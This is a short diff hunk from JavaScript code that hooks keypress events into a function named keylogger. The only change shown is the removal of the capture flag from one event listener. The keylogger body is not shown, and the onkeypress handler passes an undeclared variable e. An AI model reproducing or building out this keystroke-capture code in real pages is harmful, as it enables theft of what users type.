@@ -24,4 +24,4 @@ document.onkeypress = function (){
     keylogger(e)
 };
 
-document.addEventListener("keypress", keylogger, true);
+document.addEventListener("keypress", keylogger);
